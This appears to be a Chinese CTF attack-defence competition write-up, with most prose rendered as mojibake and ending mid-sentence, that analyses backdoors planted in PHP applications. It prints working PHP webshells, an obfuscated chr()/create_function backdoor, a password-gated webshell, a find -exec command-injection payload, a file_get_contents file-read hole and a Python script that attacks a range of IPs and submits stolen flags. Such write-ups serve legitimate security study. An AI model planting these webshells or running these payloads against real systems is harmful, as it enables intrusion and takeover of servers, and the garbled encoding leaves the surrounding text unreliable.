defined(\u0026#39;DEFAULT_ACTION\u0026#39;) or define(\u0026#39;DEFAULT_ACTION\u0026#39;, \u0026#39;index\u0026#39;); å†æ¥çœ‹APP_PATHè¿™ä¸ªè·¯å¾„apps/ï¼Œä¸‹é¢ä¼šæœ‰ä¸‰ä¸ªæ–‡ä»¶å¤¹\nadmin default install é¦–å…ˆæŸ¥çœ‹é»˜è®¤æ–‡ä»¶å¤¹defaultï¼Œçœ‹åˆ°åˆæœ‰5ä¸ªæ–‡ä»¶å¤¹\ncommon conf controller language model å†æŒ‰ç…§é¡ºåºé¦–å…ˆæ¥çœ‹ç¬¬ä¸€ä¸ªcommonï¼Œå‘ç°ä¸¤ä¸ªphpæ–‡ä»¶\nfunction.php insert.php åœ¨function.phpä¸­æœ‰ä¸ªä¸Šä¼ çš„å‡½æ•°æ¯”è¾ƒå¯ç–‘\nfunction upload_file($upload, $type) { if (!empty($upload[\u0026#39;tmp_name\u0026#39;])) { $ftype = check_file_type($upload[\u0026#39;tmp_name\u0026#39;], $upload[\u0026#39;name\u0026#39;], \u0026#39;|png|jpg|jpeg|gif|doc|xls|txt|zip|ppt|pdf|rar|docx|xlsx|pptx|\u0026#39;); if (!empty($ftype)) { $name = date(\u0026#39;Ymd\u0026#39;); for ($i = 0; $i \u0026lt; 6; $i++) { $name .= chr(mt_rand(97, 122)); } $name = $_SESSION[\u0026#39;user_id\u0026#39;] . \u0026#39;_\u0026#39; . $name . \u0026#39;.\u0026#39; . $ftype; $target = ROOT_PATH . DATA_DIR . \u0026#39;/\u0026#39; . $type . \u0026#39;/\u0026#39; . $name; if (!move_upload_file($upload[\u0026#39;tmp_name\u0026#39;], $target)) { ECTouch::err()-\u0026gt;add(L(\u0026#39;upload_file_error\u0026#39;), 1); return false; } else { return $name; } } else { ECTouch::err()-\u0026gt;add(L(\u0026#39;upload_file_type\u0026#39;), 1); return false; } } else { ECTouch::err()-\u0026gt;add(L(\u0026#39;upload_file_error\u0026#39;)); return false; } } è€Œä¸”è¿™ä¸ªå‡½æ•°åœ¨ç•™è¨€æ¿ä¸­è¢«è°ƒç”¨ï¼Œæ˜¯å¦èƒ½åˆ©ç”¨è¿˜æœ‰å¾…ç ”ç©¶ï¼Œfunction.phpä¸­çš„å…¶ä»–å‡½æ•°åŸºæœ¬æ²¡ä»€ä¹ˆå¼‚å¸¸\nå†æ¥çœ‹insert.phpï¼Œå¯ä»¥å‘ç°æœ‰ä¸ªinsert_ads()å‡½æ•°ï¼š\nfunction insert_ads($arr) { static $static_res = NULL; $time = gmtime(); if (!empty($arr[\u0026#39;num\u0026#39;]) \u0026amp;\u0026amp; $arr[\u0026#39;num\u0026#39;] != 1) { $sql = \u0026#39;SELECT a.ad_id, a.position_id, a.media_type, a.ad_link, a.ad_code, a.ad_name, p.ad_width, \u0026#39; . \u0026#39;p.ad_height, p.position_style, RAND() AS rnd \u0026#39; . \u0026#39;FROM \u0026#39; . M()-\u0026gt;pre . \u0026#39;touch_ad \u0026#39; . \u0026#39; AS a \u0026#39; . \u0026#39;LEFT JOIN \u0026#39; . M()-\u0026gt;pre . \u0026#39;touch_ad_position \u0026#39; . \u0026#39; AS p ON a.position_id = p.position_id \u0026#39; . \u0026#34;WHERE enabled = 1 AND start_time \u0026lt;= \u0026#39;\u0026#34; . $time . \u0026#34;\u0026#39; AND end_time \u0026gt;= \u0026#39;\u0026#34; . $time . \u0026#34;\u0026#39; \u0026#34; . \u0026#34;AND a.position_id = \u0026#39;\u0026#34; . $arr[\u0026#39;id\u0026#39;] . \u0026#34;\u0026#39; \u0026#34; . \u0026#39;ORDER BY rnd LIMIT \u0026#39; . $arr[\u0026#39;num\u0026#39;]; $res = M()-\u0026gt;query($sql); } else { if ($static_res[$arr[\u0026#39;id\u0026#39;]] === NULL) { $sql = \u0026#39;SELECT a.ad_id, a.position_id, a.media_type, a.ad_link, a.ad_code, a.ad_name, p.ad_width, \u0026#39; . \u0026#39;p.ad_height, p.position_style, RAND() AS rnd \u0026#39; . \u0026#39;FROM \u0026#39; . M()-\u0026gt;pre . \u0026#39;touch_ad \u0026#39; . \u0026#39; AS a \u0026#39; . \u0026#39;LEFT JOIN \u0026#39; . M()-\u0026gt;pre . \u0026#39;touch_ad_position\u0026#39; . \u0026#39; AS p ON a.position_id = p.position_id \u0026#39; . \u0026#34;WHERE enabled = 1 AND a.position_id = \u0026#39;\u0026#34; . $arr[\u0026#39;id\u0026#39;] . \u0026#34;\u0026#39; AND start_time \u0026lt;= \u0026#39;\u0026#34; . $time . \u0026#34;\u0026#39; AND end_time \u0026gt;= \u0026#39;\u0026#34; . $time . \u0026#34;\u0026#39; \u0026#34; . \u0026#39;ORDER BY rnd LIMIT 1\u0026#39;; $static_res[$arr[\u0026#39;id\u0026#39;]] = M()-\u0026gt;query($sql); } $res = $static_res[$arr[\u0026#39;id\u0026#39;]]; } $ads = array(); $position_style = \u0026#39;\u0026#39;; foreach ($res AS $row) { if ($row[\u0026#39;position_id\u0026#39;] != $arr[\u0026#39;id\u0026#39;]) { continue; } $position_style = $row[\u0026#39;position_style\u0026#39;]; switch ($row[\u0026#39;media_type\u0026#39;]) { case 0: // å›¾ç‰‡å¹¿å‘Š  $src = (strpos($row[\u0026#39;ad_code\u0026#39;], \u0026#39;http://\u0026#39;) === false \u0026amp;\u0026amp; strpos($row[\u0026#39;ad_code\u0026#39;], \u0026#39;https://\u0026#39;) === false) ? __URL__ . \u0026#34;/$row[ad_code]\u0026#34; : $row[\u0026#39;ad_code\u0026#39;]; $ads[] = \u0026#34;\u0026lt;a href=\u0026#39;\u0026#34; . url(\u0026#39;default/affiche/index\u0026#39;, array(\u0026#39;ad_id\u0026#39; =\u0026gt; $row[\u0026#39;ad_id\u0026#39;], \u0026#39;uri\u0026#39; =\u0026gt; urlencode($row[\u0026#34;ad_link\u0026#34;]))) . \u0026#34;\u0026#39; target=\u0026#39;_blank\u0026#39;\u0026gt;\u0026lt;img src=\u0026#39;$src\u0026#39; width=\u0026#39;\u0026#34; . $row[\u0026#39;ad_width\u0026#39;] . \u0026#34;\u0026#39; height=\u0026#39;$row[ad_height]\u0026#39; border=\u0026#39;0\u0026#39; /\u0026gt;\u0026lt;/a\u0026gt;\u0026#34;; break; case 1: // Flash  $src = (strpos($row[\u0026#39;ad_code\u0026#39;], \u0026#39;http://\u0026#39;) === false \u0026amp;\u0026amp; strpos($row[\u0026#39;ad_code\u0026#39;], \u0026#39;https://\u0026#39;) === false) ? __URL__ . \u0026#34;/$row[ad_code]\u0026#34; : $row[\u0026#39;ad_code\u0026#39;]; $ads[] = \u0026#34;\u0026lt;object classid=\\\u0026#34;clsid:d27cdb6e-ae6d-11cf-96b8-444553540000\\\u0026#34;\u0026#34; . \u0026#34;codebase=\\\u0026#34;http://fpdownload.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=8,0,0,0\\\u0026#34;\u0026#34; . \u0026#34;width=\u0026#39;$row[ad_width]\u0026#39; height=\u0026#39;$row[ad_height]\u0026#39;\u0026gt; \u0026lt;param name=\u0026#39;movie\u0026#39; value=\u0026#39;$src\u0026#39;\u0026gt; \u0026lt;param name=\u0026#39;quality\u0026#39; value=\u0026#39;high\u0026#39;\u0026gt; \u0026lt;embed src=\u0026#39;$src\u0026#39; quality=\u0026#39;high\u0026#39; pluginspage=\u0026#39;http://www.macromedia.com/go/getflashplayer\u0026#39; type=\u0026#39;application/x-shockwave-flash\u0026#39; width=\u0026#39;$row[ad_width]\u0026#39; height=\u0026#39;$row[ad_height]\u0026#39;\u0026gt;\u0026lt;/embed\u0026gt; \u0026lt;/object\u0026gt;\u0026#34;; break; case 2: // CODE  $ads[] = $row[\u0026#39;ad_code\u0026#39;]; break; case 3: // TEXT  $ads[] = \u0026#34;\u0026lt;a href=\u0026#39;\u0026#34; . url(\u0026#39;default/affiche/index\u0026#39;, array(\u0026#39;ad_id\u0026#39; =\u0026gt; $row[\u0026#39;ad_id\u0026#39;], \u0026#39;uri\u0026#39; =\u0026gt; urlencode($row[\u0026#34;ad_link\u0026#34;]))) . \u0026#34;\u0026#39; target=\u0026#39;_blank\u0026#39;\u0026gt;\u0026#34; . htmlspecialchars($row[\u0026#39;ad_code\u0026#39;]) . \u0026#39;\u0026lt;/a\u0026gt;\u0026#39;; break; case 4: // url  $ads[] = file_get_contents($_POST[\u0026#39;url\u0026#39;]); } } $position_style = \u0026#39;str:\u0026#39; . $position_style; $need_cache = ECTouch::view()-\u0026gt;caching; ECTouch::view()-\u0026gt;caching = false; ECTouch::view()-\u0026gt;assign(\u0026#39;ads\u0026#39;, $ads); $val = ECTouch::view()-\u0026gt;fetch($position_style); ECTouch::view()-\u0026gt;caching = $need_cache; return html_entity_decode($val); } è¿™é‡Œæ¯”è¾ƒæ‰çœ¼çš„ä¾¿æ˜¯case 4è¿™é‡Œ\ncase 4: // url  $ads[] = file_get_contents($_POST[\u0026#39;url\u0026#39;]); è¿™é‡Œå¾ˆæ˜æ˜¾åªæœ‰ä¸€æ®µä»£ç ï¼Œè€Œä¸”è¿˜æ˜¯file_get_contents()ï¼Œè¿™é‡Œä¾¿æ˜¯ä¸€ä¸ªä»»æ„æ–‡ä»¶è¯»å–çš„æ¼æ´ã€‚\nè¿™é‡Œæ”¾ä¸Šä¸€å¶é£˜é›¶å¤§ä½¬çš„jioæœ¬ä»¥ä¾›å­¦ä¹ ï¼š\nimport requests import re import time data = { \u0026#34;url\u0026#34;:\u0026#34;http://10.0.1.2?token=RCNWBJXQ\u0026#34; } url = \u0026#34;http://10.50.%s.2/mobile/index.php\u0026#34; while True: for x in range(0,37): urll = url%x try: #attack moudle r = requests.post(url=urll,data=data,timeout=3) flag = re.findall(\u0026#39;\u0026lt;li\u0026gt;.*?\u0026lt;/li\u0026gt;\u0026#39;,r.content)[0][4:-5] #submit flag moudle flagurl = \u0026#34;https://192.168.37.180/match/WAR20/oapi?atn=answers\u0026amp;token=RCNWBJXQ\u0026amp;flag=%s\u0026#34;%flag r = requests.get(url=flagurl,verify=False) #check flag if \u0026#34;wrong answer.\u0026#34; not in r.content: print flag print r.content except: pass print \u0026#34;attack ip times: \u0026#34;+str(x) time.sleep(60) è¿™é‡Œé—®ä»€ä¹ˆæ–‡ä»¶è¯»å–å°±å¯ä»¥æ‹¿åˆ°flagå‘¢ï¼Ÿå› ä¸ºfile_get_contentsè¿™ä¸ªå‡½æ•°ï¼Œæ—¢ç„¶è¦è¯»å–urlä¸­çš„æ–‡ä»¶ï¼Œè‡ªç„¶å¾—å…ˆå»è¯·æ±‚urlï¼Œæ‰€ä»¥è‡ªç„¶å¯ä»¥æ‹¿åˆ°flag\nPoc 3 å®˜æ–¹è¿˜ç»™äº†ä¸€ä¸ªmobile/api/uc.phpçš„hintï¼Œå½“æ—¶æˆ‘ä»¬çœ‹äº†ä¸€ä¸‹ï¼Œæ„Ÿè§‰æ²¡å•¥ç”¨\u0026hellip;è¿™é‡Œè¿˜æ˜¯ä¸»è¦å‚è€ƒä¸€å¶é£˜é›¶å¤§ä½¬çš„åˆ†æ\u0026hellip;\nå½“æ—¶ä¹ä¸€çœ‹å¥½åƒæ²¡ä»€ä¹ˆé—®é¢˜â€¦ç°åœ¨ä»”ç»†çœ‹è¿™é‡Œ\nif (in_array($get[\u0026#39;action\u0026#39;], array( \u0026#39;test\u0026#39;, \u0026#39;deleteuser\u0026#39;, \u0026#39;renameuser\u0026#39;, \u0026#39;gettag\u0026#39;, \u0026#39;synlogin\u0026#39;, \u0026#39;synlogout\u0026#39;, \u0026#39;updatepw\u0026#39;, \u0026#39;updatebadwords\u0026#39;, \u0026#39;updatehosts\u0026#39;, \u0026#39;updateapps\u0026#39;, \u0026#39;updateclient\u0026#39;, \u0026#39;updatecredit\u0026#39;, \u0026#39;getcreditsettings\u0026#39;, \u0026#39;updatecreditsettings\u0026#39;, \u0026#39;writesth\u0026#39; ))) { $uc_note = new uc_note(); exit($uc_note-\u0026gt;$get[\u0026#39;action\u0026#39;]($get, $post)); } else { exit(API_RETURN_FAILED); } è¿™ä¸ªarrayå°±æœ‰ä¸ªåœ°æ–¹å°±æ˜¾å¾—ç‰¹åˆ«çš„å¥‡è‘©ï¼Œé‚£å°±æ˜¯æœ€åçš„writesth\u0026hellip;\nè¦æ˜¯æ¡†æ¶çš„ä½œè€…\u0026hellip;è¿™ä¹ˆå†™æ€•ä¸æ˜¯ä¼šè¢«æ‰“æ­»\u0026hellip;è¿™é‡Œè‚¯å®šå°±æ˜¯ä¸»åŠæ–¹è‡ªå·±åŠ ä¸Šçš„ã€‚æˆ‘ä»¬å…¨å±€æœä¸€ä¸‹writesthçœ‹çœ‹éƒ½æœ‰äº›å•¥\næœç„¶æ‰¾åˆ°ä¸€ä¸ªå‡½æ•°\nfunction writesth($get, $post){ $cachefile = $this-\u0026gt;appdir .$get[\u0026#39;name\u0026#39;]; $fp = fopen($cachefile, \u0026#39;w\u0026#39;); $s = \u0026#34;\u0026lt;?php\\r\\n\u0026#34;; $s .= $get[\u0026#39;content\u0026#39;]; fwrite($fp, $s); fclose($fp); return API_RETURN_SUCCEED; } æ¢å¥è¯è¯´ï¼Œå°±æ˜¯ä¸Šä¼ çš„æ–‡ä»¶åæ˜¯ä½ getè¯·æ±‚çš„nameï¼Œå†…å®¹å°±æ˜¯ä½ çš„contentå‚æ•°ï¼Œè¿™é‡Œå°±å¯ä»¥åˆ¶é€ ä¸€ä¸ªwebshellæ¥æ‰“ã€‚\næˆ‘ä»¬ä¹Ÿå¯ä»¥æµ‹è¯•ä¸€ä¸‹ï¼š\n\u0026lt;?php function writesth($name, $content){ $cachefile = \u0026#34;./\u0026#34;.$name; $fp = fopen($cachefile, \u0026#39;w\u0026#39;); $s = \u0026#34;\u0026lt;?php\\r\\n\u0026#34;; $s .= $content; fwrite($fp, $s); fclose($fp); return 0; } $name = \u0026#34;shell.php\u0026#34;; $content = \u0026#34;@eval(\\$_POST[zedd]);\\n?\u0026gt;\u0026#34;; writesth($name,$content); ?\u0026gt;æœ¬åœ°æˆåŠŸæ‹¿åˆ°shellï¼Œshell.phpå†…å®¹ä¸º\n\u0026lt;?php @eval($_POST[zedd]); ?\u0026gt;ä½†æ˜¯è¿™é‡Œå¾—æ³¨æ„å†™å…¥çš„åœ°æ–¹æ˜¯å¦æœ‰æƒé™ï¼Œæ— æƒé™çš„è¯å¾—è€ƒè™‘å‘ä¸Šå±‚ç›®å½•èµ°ä¸€èµ°ã€‚\nSomething Else å…¶ä»–çš„ä¸€äº›ï¼Œå¯ä»¥å‚ç…§ä¸€å¶é£˜é›¶å¤§ä½¬çš„åšå®¢ï¼Œä¹Ÿå¯ä»¥å‚ç…§ECSHOP v2.7.3æ³¨å…¥æ¼æ´åˆ†æå’Œä¿®å¤è¿™ä¸ªåšå®¢ã€‚æ€»ä½“æ¥è¯´è¿˜æ˜¯ä¸€åœºæ¯”è¾ƒæœ‰æ”¶è·çš„AWDï¼Œä¹Ÿå­¦ä¹ åˆ°äº†æŒºå¤šçŸ¥è¯†ã€‚ä¹Ÿæ˜¯å‡ ä¹è¿‡äº†ä¸€ä¸ªæœˆå·¦å³æ‰æ¥æ€»ç»“è¿™æ¬¡AWD\u0026hellip;ï¼ˆå“å“Ÿè¿™ç§æ‹–å»¶ç—‡çœŸçš„æ˜¯â€¦å†™è¿™ç¯‡åŸºæœ¬é å›å¿†äº†\u0026hellip;\nç¬¬äºŒå±Šâ€œçº¢å¸½æ¯â€çº¿ä¸‹æ”»é˜²å¤§èµ› ä¸»è¦è¿˜æ˜¯å‚è€ƒä¸€å¶é£˜é›¶å¤§ä½¬çš„wpä»¥åŠè‡ªå·±çš„ä¸€äº›äº²èº«ç»å†æ€»ç»“ç»éªŒâ€¦ï¼ˆå‘ç°è·Ÿå¤§ä½¬çš„å·®è·çœŸçš„æ˜¯å¤§..2333\nè¿™é‡Œæä¸€ä¸‹ï¼Œä¸ºäº†æ‰¾åˆ°ä¸»åŠæ–¹çš„æ´çš„è¯ï¼Œå¯ä»¥ä¸‹è½½ä¸»åŠæ–¹å‡ºçš„æ¡†æ¶çš„å¯¹åº”çš„ç‰ˆæœ¬ï¼Œç„¶åè¿›è¡Œdiffï¼Œè¿™æ ·å¾ˆå¿«å°±å¯ä»¥æ‰¾åˆ°ä¸»åŠæ–¹æ•…æ„ç•™ä¸‹çš„æ´ã€‚å¦‚æœæ˜¯æ•´ä¸ªé¡¹ç›®æ¯”è¾ƒçš„è¯å•Šï¼Œæˆ‘è¿˜æ˜¯æ¯”è¾ƒæ¨èBeyondCompareçš„.\nWeb1 Poc 1 åœ¨wp-admin/tools.phpä¸‹æœ‰ä¸€ä¸ªä¸»åŠæ–¹ç•™ä¸‹çš„æ´ï¼š\n$poc=\u0026#34;a#s#s#e#r#t\u0026#34;; $poc_1=explode(\u0026#34;#\u0026#34;,$poc); $poc_2=$poc_1[0].$poc_1[1].$poc_1[2].$poc_1[3].$poc_1[4].$poc_1[5]; @$poc_2($_POST[\u0026#39;_\u0026#39;]); explodeçš„[è§£é‡Šç”¨æ³•][http://www.w3school.com.cn/php/func_string_explode.asp]\n arrayÂ explodeÂ (Â stringÂ $delimiterÂ ,Â stringÂ $stringÂ [,Â intÂ $limitÂ ] )\nexplode() å‡½æ•°æŠŠå­—ç¬¦ä¸²æ‰“æ•£ä¸ºæ•°ç»„ã€‚\n ä¹Ÿå¯ä»¥ç›´æ¥echoçœ‹ä¸€ä¸‹$poc_2å°±æ˜¯assertï¼Œä¹Ÿå°±æ˜¯@assert($_POST['_'])è¿™ä¸ªé©¬ã€‚\nPoc 2 åœ¨wp-login.phpä¸‹æ³¨æ„åˆ°å¦‚ä¸‹ä»£ç ï¼Œæœ‰systemå¾ˆå¯èƒ½æ˜¯ä¸€ä¸ªä»»æ„å‘½ä»¤æ‰§è¡Œï¼š\ncase \u0026#39;debug\u0026#39;: $file = addslashes($_POST[\u0026#39;file\u0026#39;]); system(\u0026#34;find /tmp -iname \u0026#34;.escapeshellcmd($file)); break; é¦–å…ˆæˆ‘ä»¬å…ˆè§£é‡Šaddslashes()è¿™ä¸ªå‡½æ•°çš„[åŸºæœ¬ç”¨æ³•][http://php.net/manual/zh/function.addslashes.php]\n stringÂ addslashesÂ (Â stringÂ $strÂ )\naddslashesÂ â€”Â ä½¿ç”¨åæ–œçº¿å¼•ç”¨å­—ç¬¦ä¸²\nè¿”å›å­—ç¬¦ä¸²ï¼Œè¯¥å­—ç¬¦ä¸²ä¸ºäº†æ•°æ®åº“æŸ¥è¯¢è¯­å¥ç­‰çš„éœ€è¦åœ¨æŸäº›å­—ç¬¦å‰åŠ ä¸Šäº†åæ–œçº¿ã€‚è¿™äº›å­—ç¬¦æ˜¯å•å¼•å·ï¼ˆ'ï¼‰ã€åŒå¼•å·ï¼ˆ\u0026quot;ï¼‰ã€åæ–œçº¿ï¼ˆ**ï¼‰ä¸ NULï¼ˆNULLÂ å­—ç¬¦ï¼‰ã€‚\n è¿˜æœ‰escapeshellcmd()çš„[åŸºæœ¬ç”¨æ³•][http://php.net/manual/zh/function.escapeshellcmd.php]\n stringÂ escapeshellcmdÂ (Â stringÂ $commandÂ )\nescapeshellcmdÂ â€”Â shell å…ƒå­—ç¬¦è½¬ä¹‰\nescapeshellcmd() å¯¹å­—ç¬¦ä¸²ä¸­å¯èƒ½ä¼šæ¬ºéª— shell å‘½ä»¤æ‰§è¡Œä»»æ„å‘½ä»¤çš„å­—ç¬¦è¿›è¡Œè½¬ä¹‰ã€‚ æ­¤å‡½æ•°ä¿è¯ç”¨æˆ·è¾“å…¥çš„æ•°æ®åœ¨ä¼ é€åˆ° exec æˆ– system() å‡½æ•°ï¼Œæˆ–è€… æ‰§è¡Œæ“ä½œç¬¦ ä¹‹å‰è¿›è¡Œè½¬ä¹‰ã€‚\nåæ–œçº¿ï¼ˆ\\ï¼‰ä¼šåœ¨ä»¥ä¸‹å­—ç¬¦ä¹‹å‰æ’å…¥ï¼š *\u0026amp;#;`|*?~\u0026lt;\u0026gt;^()[]{}$*, \\x0A å’Œ \\xFFã€‚ ' å’Œ \u0026quot; ä»…åœ¨ä¸é…å¯¹å„¿çš„æ—¶å€™è¢«è½¬ä¹‰ã€‚ åœ¨ Windows å¹³å°ä¸Šï¼Œæ‰€æœ‰è¿™äº›å­—ç¬¦ä»¥åŠ % å’Œ ! å­—ç¬¦éƒ½ä¼šè¢«ç©ºæ ¼ä»£æ›¿ã€‚\n åŸºæœ¬å°±æ˜¯æŠŠå¼•å·ä»€ä¹ˆçš„åŠå…¶å…¶ä»–çš„ç»™è½¬ä¹‰äº†çš„æ„æ€ã€‚\nsystemä¸­è¦æ‰§è¡Œçš„å°±æ˜¯åœ¨/tmpç›®å½•ä¸‹æŸ¥æ‰¾$_POSTçš„å‚æ•°çš„æ–‡ä»¶ã€‚è€Œä¸”æ ¹æ®findçš„æ‰‹å†Œï¼Œæˆ‘ä»¬å¯ä»¥çŸ¥é“å®ƒè¿˜æœ‰ä¸€ä¸ªexecçš„å‚æ•°ã€‚\n -execÂ å‚æ•°åé¢è·Ÿçš„æ˜¯commandå‘½ä»¤ï¼Œå®ƒçš„ç»ˆæ­¢æ˜¯ä»¥;ä¸ºç»“æŸæ ‡å¿—çš„ï¼Œæ‰€ä»¥è¿™å¥å‘½ä»¤åé¢çš„åˆ†å·æ˜¯ä¸å¯ç¼ºå°‘çš„ï¼Œè€ƒè™‘åˆ°å„ä¸ªç³»ç»Ÿä¸­åˆ†å·ä¼šæœ‰ä¸åŒçš„æ„ä¹‰ï¼Œæ‰€ä»¥å‰é¢åŠ åæ–œæ ã€‚\n{}Â èŠ±æ‹¬å·ä»£è¡¨å‰é¢findæŸ¥æ‰¾å‡ºæ¥çš„æ–‡ä»¶åã€‚\ninameåœ¨è¿™é‡ŒæŒ‡çš„æ˜¯ä¸åŒºåˆ†å¤§å°å†™ï¼›nameåˆ™ä¸ºåŒºåˆ†å¤§å°å†™\nä¾‹å¦‚\nfindÂ /etcÂ -nameÂ \u0026#34;passwd*\u0026#34;Â -execÂ grepÂ \u0026#34;root\u0026#34;Â {}Â \\; è¿™é‡Œæ˜¯æŸ¥æ‰¾/etcä¸‹åä¸ºä»¥passwdå¼€å¤´çš„æ–‡ä»¶ä¸­æ˜¯å¦å«æœ‰root\n è¿™é‡Œæˆ‘ä»¬åªéœ€è¦éšä¾¿ç©¿ä¸€ä¸ªæ–‡ä»¶åï¼Œå†åŠ ä¸Š-exec cat /flag ;å› ä¸ºæœ€å;æ˜¯è¢«escapeshellcmdç»™è½¬ä¹‰äº†ï¼Œæ‰€ä»¥ä¸éœ€è¦åŠ åæ–œæ ã€‚å¦‚æœåŠ ä¸Š-orçš„è¯å°±ç›¸å½“äºå¯ä»¥ç›´æ¥æ‰§è¡Œ-execåçš„å‘½ä»¤ã€‚æ‰€ä»¥è¿™é‡Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨payload\nfind /tmp -iname a -or -exec cat /flag/flag ; å¯ä»¥æ‹¿phpæœ¬åœ°æµ‹è¯•ä¸€ä¸‹\n\u0026lt;?php $a = \u0026#34;a -or -exec cat /flag/flag ;\u0026#34;; $file = addslashes($a); system(\u0026#34;find /tmp -iname \u0026#34;.escapeshellcmd($file)); ?\u0026gt;Poc 3 åœ¨index.phpä¸‹ç›´æ¥æœ‰ä¸€ä¸ªæš´éœ²çš„å°é©¬\n@eval($_POST[\u0026#39;admin\u0026#39;]); Poc 4 åœ¨class-wp-cachefile.phpä¸­ï¼Œè¯¦ç»†åˆ†æè§ï¼š[å‚è€ƒé“¾æ¥][https://github.com/bl4de/security_whitepapers/blob/master/RIPS_PHP_Security_Calendar_2017.md]\nEles æŠ„äº†ä¸€ä¸ªä½œä¸š\n\u0026lt;script language=\u0026#34;PHP\u0026#34;\u0026gt;if(md5($_GET[guo])===\u0026#34;fe831851246d186db20c229fa19a0172\u0026#34;){@eval($_POST[power]);}\u0026lt;/script\u0026gt; åŸºæœ¬å°±æ˜¯ä¹Ÿè·Ÿç€æ‹¿è¿™ä¸ªé©¬ä¸€æ ·æ‰“åˆ«äºº\u0026hellip;ä¹Ÿç®—æ˜¯åçŸ¥åè§‰å§\u0026hellip;åæ¥åªèƒ½æ‰“ä¸ºæ•°ä¸å¤šå‡ ä¸ªäº†å§\u0026hellip;\nä¸»è¦æ˜¯web1ç»™çš„ç”¨æˆ·å¯¹webç›®å½•æ²¡æœ‰å†™çš„æƒé™ï¼Œå½“æ—¶æ²¡ä»€ä¹ˆç»éªŒ\u0026hellip;ä¸çŸ¥é“è‡ªå·±ä¼ ä¸ªé©¬æ‰“è‡ªå·±â€¦è¿™å°±å¾ˆéš¾å—äº†\u0026hellip;å¯¼è‡´äº†web1è¢«æ‰“ç©¿äº†\u0026hellip;ä»¥åŠè¿˜æœ‰ä¸æ­»é©¬\u0026hellip;\nWeb2 è¿™é‡Œä¸å¾—ä¸åæ§½ä¸€ä¸‹web2çš„checkeræœºåˆ¶ï¼Œåªæ”¾ä¸¤ä¸ªé™æ€éƒ½èƒ½è¿‡checkerï¼Œç¨³å¾—ä¸è¡Œ\u0026hellip;\nPoc 1 çœ‹åˆ°/config/siteä¸‹æœ‰ä¸¤ä¸ªè«åå…¶å¦™çš„å‘½åçš„phpæ–‡ä»¶ï¼š\n1.php 2.php ä¸€çœ‹å°±åº”è¯¥æ˜¯æŸäº›é©¬çš„å­˜æ”¾ä½ç½®å’¯\nåœ¨1.phpä¸­å¯ä»¥çœ‹åˆ°\n\u0026#39;SITE_DOMAINS\u0026#39; =\u0026gt; \u0026#39;123sadccv=\u0026gt;1)\u0026amp;\u0026amp;($_GET[a]($_GET[b]));exit();$a=array(a\u0026#39;, //ç½‘ç«™çš„å…¶ä»–åŸŸå å¾ˆæ˜æ˜¾çš„ä½ç½®$_GET[a]($_GET[b])\nPoc 2 2.phpä¸­ï¼š\n\u0026lt;?php $_uU=chr(99).chr(104).chr(114); $_cC=$_uU(101).$_uU(118).$_uU(97).$_uU(108).$_uU(40).$_uU(36).$_uU(95).$_uU(80).$_uU(79).$_uU(83).$_uU(84).$_uU(91).$_uU(50).$_uU(93).$_uU(41).$_uU(59); $_fF=$_uU(99).$_uU(114).$_uU(101).$_uU(97).$_uU(116).$_uU(101).$_uU(95).$_uU(102).$_uU(117).$_uU(110).$_uU(99).$_uU(116).$_uU(105).$_uU(111).$_uU(110); $_=$_fF(\u0026#34;\u0026#34;,$_cC); @$_(); ?\u0026gt;var_dumpå¯ä»¥çœ‹åˆ°\n$_uU -\u0026gt; string(3) \u0026quot;chr\u0026quot; $_cC -\u0026gt; string(16) \u0026quot;eval($_POST[2]);\u0026quot; $_fF -\u0026gt; string(15) \u0026quot;create_function\u0026quot; æ‰€ä»¥æ˜¯ï¼š\n$_ = create_function(\u0026#34;\u0026#34;,eval($_POST[2])); å¯ä»¥ç›´æ¥ç”¨POST 2=phpinfo();ä½¿ç”¨\nPoc 3 åœ¨ä¸å®˜æ–¹çš„fincmså¯¹æ¯”ä¸‹æˆ‘ä»¬å¯ä»¥å‘ç°æ–°å¢æ–‡ä»¶ä¸ºfinecms/dayrui/config/config.class.php \n\u0026lt;?php $config = unserialize(base64_decode($config)); if(isset($_GET[\u0026#39;param\u0026#39;])){ $config-\u0026gt;$_GET[\u0026#39;param\u0026#39;]; } class FinecmsConfig{ private $config; private $path; public $filter; public function __construct($config=\u0026#34;\u0026#34;){ $this-\u0026gt;config = $config; echo 123; } public function getConfig(){ if($this-\u0026gt;config == \u0026#34;\u0026#34;){ $config = isset($_POST[\u0026#39;Finecmsconfig\u0026#39;])?$_POST[\u0026#39;Finecmsconfig\u0026#39;]:\u0026#34;\u0026#34;; } } public function SetFilter($value){ if($this-\u0026gt;filter){ foreach($this-\u0026gt;filter as $filter){ $array = is_array($value)?array_map($filter,$value):call_user_func($filter,$value); } $this-\u0026gt;filter = array(); }else{ return false; } return true; } public function __get($key){ $this-\u0026gt;SetFilter($key); die(\u0026#34;\u0026#34;); } } å¼€å¤´çœ‹èµ·æ¥æœ‰ä¸ªé©¬çš„æ ·å­ã€‚\nç›´æ¥å®šä½è¯¥æ–‡ä»¶çš„å¼•ç”¨ä½ç½®:finecms/Init.phpï¼Œçœ‹åˆ°å…³é”®å‡½æ•°è¿™é‡Œï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°\nif(isset($_COOKIE[\u0026#39;FINECMS_CONFIG\u0026#39;])){ $config = $_COOKIE[\u0026#39;FINECMS_CONFIG\u0026#39;]; require FCPATH.\u0026#39;dayrui/config/config.class.php\u0026#39;; } åœ¨index.phpå¯ä»¥æ‰¾åˆ°FCPATHçš„define\ndefine(\u0026#39;FCPATH\u0026#39;, dirname(__FILE__).\u0026#39;/finecms/\u0026#39;); æ‰€ä»¥ä¸Šé¢é‚£æ®µä»£ç å°±æ˜¯æŠŠè¿™ä¸ªconfig.class.phpç»™å¼•å…¥è¿›æ¥ã€‚è€Œ$configç”±Init.phpä¸­çš„cookieä¸­çš„FINECMS_CONFIGå–å¾—ã€‚\næ•´ä¸ªä»£ç é€»è¾‘å°±æ˜¯å…ˆè·å–cookieä¸­çš„FINECOMS_CONFIGçš„å‚æ•°ï¼Œç„¶åè°ƒç”¨config.class.phpï¼Œå…ˆå¯¹$configè¿›è¡Œbase64è§£ç ï¼Œå†è¿›è¡Œååºåˆ—åŒ–ï¼Œæ£€æŸ¥æ˜¯å¦æœ‰GETè¯·æ±‚ä¼ 